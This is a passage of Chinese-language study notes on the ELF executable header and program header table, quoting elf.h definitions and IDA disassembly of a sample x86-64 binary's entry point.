<p>这16个字符分别代表的信息在<code>elf.h</code>中给出了宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Fields in the e_ident array.  The EI_* macros are indices into the</span></span><br><span class="line"><span class="comment">   array.  The macros under each EI_* macro are the values the byte</span></span><br><span class="line"><span class="comment">   may have.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG0		0		<span class="comment">/* File identification byte 0 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG0		0x7f		<span class="comment">/* Magic number byte 0 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG1		1		<span class="comment">/* File identification byte 1 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG1		<span class="string">&#x27;E&#x27;</span>		<span class="comment">/* Magic number byte 1 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG2		2		<span class="comment">/* File identification byte 2 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG2		<span class="string">&#x27;L&#x27;</span>		<span class="comment">/* Magic number byte 2 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG3		3		<span class="comment">/* File identification byte 3 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG3		<span class="string">&#x27;F&#x27;</span>		<span class="comment">/* Magic number byte 3 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conglomeration of the identification bytes, for easy testing as a word.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	ELFMAG		<span class="string">&quot;\177ELF&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	SELFMAG		4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_CLASS	4		<span class="comment">/* File class byte index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASSNONE	0		<span class="comment">/* Invalid class */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASS32	1		<span class="comment">/* 32-bit objects */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASS64	2		<span class="comment">/* 64-bit objects */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASSNUM	3</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h5
id="前四字符e_identei_mag0e_identei_mag3">前四字符<code>e_ident[EI_MAG0]~e_ident[EI_MAG3]</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG0		0		<span class="comment">/* File identification byte 0 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG0		0x7f		<span class="comment">/* Magic number byte 0 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG1		1		<span class="comment">/* File identification byte 1 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG1		<span class="string">&#x27;E&#x27;</span>		<span class="comment">/* Magic number byte 1 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG2		2		<span class="comment">/* File identification byte 2 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG2		<span class="string">&#x27;L&#x27;</span>		<span class="comment">/* Magic number byte 2 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_MAG3		3		<span class="comment">/* File identification byte 3 index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFMAG3		<span class="string">&#x27;F&#x27;</span>		<span class="comment">/* Magic number byte 3 */</span></span></span><br></pre></td></tr></table></figure>
<p>前四个字符<code>7F454C46</code>的ASCII码是<code>[DEL]ELF</code>,ELF魔数前面有一个DEL删除符,不是ASCII可打印字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Conglomeration of the identification bytes, for easy testing as a word.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	ELFMAG		<span class="string">&quot;\177ELF&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	SELFMAG		4</span></span><br></pre></td></tr></table></figure>
<h5
id="第五个字符e_identei_class">第五个字符<code>e_ident[EI_CLASS]</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_CLASS	4		<span class="comment">/* File class byte index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASSNONE	0		<span class="comment">/* Invalid class */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASS32	1		<span class="comment">/* 32-bit objects */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFCLASS64	2		<span class="comment">/* 64-bit objects */</span></span></span><br></pre></td></tr></table></figure>
<p>0表示无效elf文件</p>
<p>1表示32位elf文件</p>
<p>2表示64位elf文件</p>
<h5
id="第六个字符e_identei_data">第六个字符<code>e_ident[EI_DATA]</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_DATA		5		<span class="comment">/* Data encoding byte index */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFDATANONE	0		<span class="comment">/* Invalid data encoding */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFDATA2LSB	1		<span class="comment">/* 2&#x27;s complement, little endian */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFDATA2MSB	2		<span class="comment">/* 2&#x27;s complement, big endian */</span></span></span><br></pre></td></tr></table></figure>
<p>规定数据大小端顺序</p>
<p>0无效格式</p>
<p>1小端格式</p>
<p>2大端格式</p>
<h5
id="第七个字符e_identei_version">第七个字符<code>e_ident[EI_VERSION]</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_VERSION	6		<span class="comment">/* File version byte index */</span></span></span><br><span class="line">					<span class="comment">/* Value must be EV_CURRENT */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for e_version (version).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_NONE		0		<span class="comment">/* Invalid ELF version */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_CURRENT	1		<span class="comment">/* Current version */</span></span></span><br></pre></td></tr></table></figure>
<p>注释中写道,该值必须为<code>EV_CURRENT(1)</code></p>
<p>其意义是ELF的主版本号,为啥一定是1呢?</p>
<p>因为ELF最新版本是1.2,之后没有更新,因此最新版本也就是先行版本,就是1</p>
<p>后面9个字符elf标准没有要求,一般置0,但是elf.h中是有意义的</p>
<h5
id="第八个字符e_identei_osabi">第八个字符<code>e_ident[EI_OSABI]</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_OSABI	7		<span class="comment">/* OS ABI identification */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_NONE		0	<span class="comment">/* UNIX System V ABI */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_SYSV		0	<span class="comment">/* Alias.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_HPUX		1	<span class="comment">/* HP-UX */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_NETBSD		2	<span class="comment">/* NetBSD.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_GNU		3	<span class="comment">/* Object uses GNU ELF extensions.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_LINUX		ELFOSABI_GNU <span class="comment">/* Compatibility alias.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_SOLARIS	6	<span class="comment">/* Sun Solaris.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_AIX		7	<span class="comment">/* IBM AIX.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_IRIX		8	<span class="comment">/* SGI Irix.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_FREEBSD	9	<span class="comment">/* FreeBSD.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_TRU64		10	<span class="comment">/* Compaq TRU64 UNIX.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_MODESTO	11	<span class="comment">/* Novell Modesto.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_OPENBSD	12	<span class="comment">/* OpenBSD.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_ARM_AEABI	64	<span class="comment">/* ARM EABI */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_ARM		97	<span class="comment">/* ARM */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFOSABI_STANDALONE	255	<span class="comment">/* Standalone (embedded) application */</span></span></span><br></pre></td></tr></table></figure>
<p>OS ABI identification,操作系统 应用 二进制 接口 标识</p>
<blockquote>
<p>关于ABI,参考了<a
target="_blank" rel="noopener" href="https://www.zhihu.com/question/381069847">你们说的ABI，Application
Binary Interface到底是什么东西？ - 知乎 (zhihu.com)</a></p>
<p>关键点:</p>
<p><strong>ABI实际上讨论的是什么?</strong></p>
<p>那么当人们提到 ABI
的时候，到底在说什么？以我个人的经验来看，当人们提及 ABI
时，一般主要是在说 Binary-compatible 即二进制兼容性。</p>
<p><strong>什么是二进制兼容性?</strong></p>
<p>一个库在 VC9 上完成编译并以 DLL
形式发布，如果该库要求使用它的应用程序也必须在 VC9
上编译，那么说这个库不是二进制兼容的；反之，如果任意版本的 VC
乃至其它编译器例如 gcc、clang
都可以使用这个库，那么说这个库是二进制兼容的。</p>
<p>二进制兼容性包括调用约定,命名管理</p>
</blockquote>
<blockquote>
<p>ABI（Application Binary
Interface）：应用程序二进制接口，描述了应用程序和操作系统之间，一个应用和它的库之间，或者应用的组成部分之间的低接口。ABI涵盖了各种细节，如：</p>
<ul>
<li>数据类型的大小、布局和对齐；</li>
<li>调用约定（控制着函数的参数如何传送以及如何接受返回值），例如，是所有的参数都通过栈传递，还是部分参数通过寄存器传递；哪个寄存器用于哪个函数参数；通过栈传递的第一个函数参数是最先push到栈上还是最后；</li>
<li><a
target="_blank" rel="noopener" href="https://baike.baidu.com/item/系统调用">系统调用</a>的编码和一个应用如何向操作系统进行系统调用；</li>
<li>以及在一个完整的操作系统ABI中，<a
target="_blank" rel="noopener" href="https://baike.baidu.com/item/目标文件">目标文件</a>的<a
target="_blank" rel="noopener" href="https://baike.baidu.com/item/二进制/361457">二进制</a>格式、程序库等等。</li>
</ul>
</blockquote>
<p><code>ELFOSABI_NONE(0)</code>表明本文件满足<code>UNIX System V ABI</code>规范,已成为主要的Unix操作系统（例如Linux，BSD系统和许多其他操作系统）使用的标准ABI</p>
<blockquote>
<p>那么调用约定就得查UNIX System
V,查stdcall,fastcall,cdecl等等没有没用</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220428152425649.png" /></p>
</blockquote>
<h5
id="第九个字符e_identei_abiversion">第九个字符<code>e_ident[EI_ABIVERSION]</code></h5>
<p>ABI版本号,然而实际上都是0</p>
<h5 id="剩下七个字符">剩下七个字符</h5>
<p>全是<del>胸垫</del>,目前没有作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define EI_PAD		9		/* Byte index of padding bytes */</span><br></pre></td></tr></table></figure>
<h4 id="e_type">e_type</h4>
<p>目标文件类型,区分库文件,可重定位目标模块,可执行目标文件等等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for e_type (object file type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ET_NONE		0		<span class="comment">/* No file type */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ET_REL		1		<span class="comment">/* Relocatable file 可重定位.o文件*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ET_EXEC		2		<span class="comment">/* Executable file 可执行.out文件*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ET_DYN		3		<span class="comment">/* Shared object file 动态库.so文件*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ET_CORE		4		<span class="comment">/* Core file 核心文件*/</span></span></span><br></pre></td></tr></table></figure>
<h4 id="e_machine">e_machine</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for e_machine (architecture).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_NONE		 0	<span class="comment">/* No machine */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_M32		 1	<span class="comment">/* AT&amp;T WE 32100 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_SPARC	 2	<span class="comment">/* SUN SPARC */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_386		 3	<span class="comment">/* Intel 80386 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_68K		 4	<span class="comment">/* Motorola m68k family */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_88K		 5	<span class="comment">/* Motorola m88k family */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_IAMCU	 6	<span class="comment">/* Intel MCU */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_860		 7	<span class="comment">/* Intel 80860 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_MIPS		 8	<span class="comment">/* MIPS R3000 big-endian */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_S370		 9	<span class="comment">/* IBM System/370 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_MIPS_RS3_LE	10	<span class="comment">/* MIPS R3000 little-endian */</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_X86_64	62	<span class="comment">/* AMD x86-64 architecture */</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EM_NUM		253</span></span><br></pre></td></tr></table></figure>
<p><code>e_machine</code>的有效值总共有253个,每一个代表一种机器类型</p>
<p>可执行目标文件<code>main</code>中该值为<code>EM_X86_64(62)</code>,意思是本程序只能在x86_64体系上执行,</p>
<p>在x86_32上或者MIPS等等都不行</p>
<h4 id="e_version">e_version</h4>
<p>elf版本号,有效值只有1,也就是先行ELF文件版本,作用和<code>e_ident[EI_VERSION]</code>相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for e_version (version).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_NONE		0		<span class="comment">/* Invalid ELF version */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_CURRENT	1		<span class="comment">/* Current version */</span></span></span><br></pre></td></tr></table></figure>
<h4 id="e_entry">e_entry</h4>
<p>ELF文件的入口点,如果没有入口点,比如库文件,则该值默认为0</p>
<p>main文件中该值为<code>0x1040</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805164912919.png"
alt="image-20220805164912919" />
<figcaption aria-hidden="true">image-20220805164912919</figcaption>
</figure>
<p>本文件开始运行后,操作系统将控制转移给该位置的指令</p>
<p>用ida64打开main按下g跳转0x1040,发现是<code>start</code>的RVA(虚拟内存相对偏移量)地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001040                 public start</span><br><span class="line">.text:0000000000001040 start           proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:0000000000001040 ; __unwind &#123;</span><br><span class="line">.text:0000000000001040                 xor     ebp, ebp</span><br><span class="line">.text:0000000000001042                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000001045                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000001046                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000001049                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000000104D                 push    rax</span><br><span class="line">.text:000000000000104E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000000104F                 lea     r8, __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000001056                 lea     rcx, __libc_csu_init ; init</span><br><span class="line">.text:000000000000105D                 lea     rdi, main       ; main</span><br><span class="line">.text:0000000000001064                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000000106A                 hlt</span><br><span class="line">.text:000000000000106A ; &#125; // starts at 1040</span><br><span class="line">.text:000000000000106A start           endp</span><br></pre></td></tr></table></figure>
<p>即装载器装载该文件进入内存之后,控制转移到进程映像相对映像基址的偏移量为0x1040的地方</p>
<p>该值可以在链接时修改,<code>gcc -e</code>指定入口函数</p>
<h4 id="e_phoff">e_phoff</h4>
<p>program headeer table offset</p>
<p>程序头部表在文件中的字节偏移量,如果没有程序头部表则该值为0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805170202544.png"
alt="image-20220805170202544" />
<figcaption aria-hidden="true">image-20220805170202544</figcaption>
</figure>
<p>main中该值为64D=40H</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805170330203.png"
alt="image-20220805170330203" />
<figcaption aria-hidden="true">image-20220805170330203</figcaption>
</figure>
<p>而本文件的0x40位置确实是程序头部表的基地址</p>
<h4 id="e_shoff">e_shoff</h4>
<p>section header table offset</p>
<p>节头部表在文件中的字节偏移量,如果没有节头表则该值为0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805170506360.png"
alt="image-20220805170506360" />
<figcaption aria-hidden="true">image-20220805170506360</figcaption>
</figure>
<p>main中该值为14090D=3700h</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805170723100.png"
alt="image-20220805170723100" />
<figcaption aria-hidden="true">image-20220805170723100</figcaption>
</figure>
<p>本文件的0x3700位置确实是节头表</p>
<h4 id="e_flags">e_flags</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Values for Elf64_Ehdr.e_flags.  */</span><br><span class="line"></span><br><span class="line">#define EF_SPARCV9_MM		3</span><br><span class="line">#define EF_SPARCV9_TSO		0</span><br><span class="line">#define EF_SPARCV9_PSO		1</span><br><span class="line">#define EF_SPARCV9_RMO		2</span><br><span class="line">#define EF_SPARC_LEDATA		0x800000 /* little endian data */</span><br><span class="line">#define EF_SPARC_EXT_MASK	0xFFFF00</span><br><span class="line">#define EF_SPARC_32PLUS		0x000100 /* generic V8+ features */</span><br><span class="line">#define EF_SPARC_SUN_US1	0x000200 /* Sun UltraSPARC1 extensions */</span><br><span class="line">#define EF_SPARC_HAL_R1		0x000400 /* HAL R1 extensions */</span><br><span class="line">#define EF_SPARC_SUN_US3	0x000800 /* Sun UltraSPARCIII extensions */</span><br></pre></td></tr></table></figure>
<p>处理器相关标志</p>
<h4 id="e_ehsize">e_ehsize</h4>
<p>ELF文件头的大小</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805171525758.png"
alt="image-20220805171525758" />
<figcaption aria-hidden="true">image-20220805171525758</figcaption>
</figure>
<p>main中该值为64D=40H</p>
<p>即前64个字节是ELF header,后面紧接着是程序头表(如果存在的话)</p>
<h4 id="e_phentsize">e_phentsize</h4>
<p>程序头表中表项的大小(每个表项一样大)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805172137637.png"
alt="image-20220805172137637" />
<figcaption aria-hidden="true">image-20220805172137637</figcaption>
</figure>
<p>main中该值为56D</p>
<h4 id="e_phnum">e_phnum</h4>
<p>程序头项数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805174430352.png"
alt="image-20220805174430352" />
<figcaption aria-hidden="true">image-20220805174430352</figcaption>
</figure>
<p>main中该值为23D</p>
<p>程序头项数乘以每项大小就可以计算得到程序头总大小56*23=1288字节</p>
<h4 id="e_shentsize">e_shentsize</h4>
<p>section header entry size</p>
<p>节头表表项大小</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805174753025.png"
alt="image-20220805174753025" />
<figcaption aria-hidden="true">image-20220805174753025</figcaption>
</figure>
<p>main中该值为64D=40h</p>
<h4 id="e_shnum">e_shnum</h4>
<p>节头表项数</p>
<h4 id="e_shstrndx">e_shstrndx</h4>
<p>section header string table
index,节名字符串表(.shstrtab)<strong>的表头</strong>在节头表中的下标</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806102105072.png"
alt="image-20220806102105072" />
<figcaption aria-hidden="true">image-20220806102105072</figcaption>
</figure>
<p>记录这么一个东西的目的是,方便获取各个节的名称,ELF头大小固定,节头表的基址在ELF头中已经给出,e_shoff,节头表表项大小业已给出e_shentsize,那么<code>e_shoff+e_shentsize*e_shstrndx</code>就索引到了节名字符串表,方便获取节名</p>
<h3 id="程序头表">程序头表</h3>
<p>Program Header Table
,是Elf64_Phdr结构体数组,描述<strong>段信息</strong>或者准备程序执行所需要的信息</p>
<blockquote>
<p>一个段可能包含多个节.</p>
<p>程序运行时才会把多个性质相同的节合并成段,因此段表只对可执行目标文件有意义</p>
<p>可重定位目标文件中没有程序头表</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806081713545.png"
alt="image-20220806081713545" />
<figcaption aria-hidden="true">image-20220806081713545</figcaption>
</figure>
<p>main的程序头表中有13项,下标从0到12</p>
<p>程序头表项结构体<code>struct Elf64_Phdr</code>(program header
descriptor)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>
<p>以栈段为例子,炎鸠一下段表项各成员的含义</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806082000923.png"
alt="image-20220806082000923" />
<figcaption aria-hidden="true">image-20220806082000923</figcaption>
</figure>
<h4 id="p_type">p_type</h4>
<p>段类型,枚举类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for p_type (segment type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	PT_NULL		0		<span class="comment">/* Program header table entry unused */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOAD		1		<span class="comment">/* Loadable program segment */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_DYNAMIC	2		<span class="comment">/* Dynamic linking information */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_INTERP	3		<span class="comment">/* Program interpreter */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_NOTE		4		<span class="comment">/* Auxiliary information */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_SHLIB	5		<span class="comment">/* Reserved */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_PHDR		6		<span class="comment">/* Entry for header table itself */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_TLS		7		<span class="comment">/* Thread-local storage segment */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	PT_NUM		8		<span class="comment">/* Number of defined types */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOOS		0x60000000	<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_GNU_EH_FRAME	0x6474e550	<span class="comment">/* GCC .eh_frame_hdr segment */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_GNU_STACK	0x6474e551	<span class="comment">/* Indicates stack executability */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_GNU_RELRO	0x6474e552	<span class="comment">/* Read-only after relocation */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_GNU_PROPERTY	0x6474e553	<span class="comment">/* GNU property */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOSUNW	